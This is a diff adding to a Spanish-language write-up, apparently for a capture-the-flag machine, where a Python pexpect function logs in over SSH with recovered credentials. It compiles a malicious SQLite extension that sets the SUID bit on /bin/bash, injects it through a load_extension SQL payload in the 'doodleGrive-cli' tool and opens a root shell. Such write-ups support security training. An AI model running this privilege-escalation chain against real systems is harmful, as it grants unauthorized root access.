@@ -141,3 +141,42 @@ def CrackPass():
 ```
 
 Finalmente, se accede a la función **Doodle** para primero acceder como el usuario **tom** con su contraseña conseguida en la función **CrackPass** y luego realizar todos los pasos necesarios para la escalada de privilegios.
+
+```python
+def Doodle(username,password_2):
+	ssh_command = f"ssh {username}@10.10.11.235"
+
+	ssh_session = pexpect.spawn(ssh_command, timeout=None)
+
+	ssh_session.expect('password:')
+
+	ssh_session.sendline(password_2)
+
+	ssh_session.sendline('export TERM=xterm')
+
+	ssh_session.sendline('echo -e "#include <stdlib.h>\\n void sqlite3_extension_init() {\\n\\tsetuid(0);\\n\\tsetgid(0);\\n\\tsystem(\\"/usr/bin/chmod u+s /bin/bash\\");\\n}" > test.c')
+
+	ssh_session.sendline(' gcc test.c -shared -fPIC -o a')
+
+	ssh_session.sendline('./doodleGrive-cli')
+
+	ssh_session.sendline('moriarty')
+
+	ssh_session.sendline('findMeIfY0uC@nMr.Holmz!')
+
+	ssh_session.sendline('5')
+
+	ssh_session.sendline('"+load_extension(char(46,47,97))+"')
+
+	time.sleep(1)
+
+	ssh_session.sendline('6')
+
+	time.sleep(1)
+
+	ssh_session.sendline('bash -p')
+
+	ssh_session.sendline('clear')
+
+	ssh_session.interact()
+```
